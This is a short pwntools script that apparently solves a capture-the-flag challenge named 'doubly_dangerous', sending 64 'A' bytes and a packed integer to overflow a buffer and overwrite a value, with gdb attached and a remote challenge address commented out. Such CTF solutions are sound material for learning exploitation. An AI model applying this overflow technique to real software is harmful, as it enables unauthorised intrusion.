from pwn import *

context.log_level = "Debug"
io = process("./doubly_dangerous")
# io = remote("114.55.66.54", 10001)
gdb.attach(io, 'break puts')


payload = "A" * 0x40
payload += p32(1093959680)
io.sendline(payload)
io.recvall()
#io.recv()
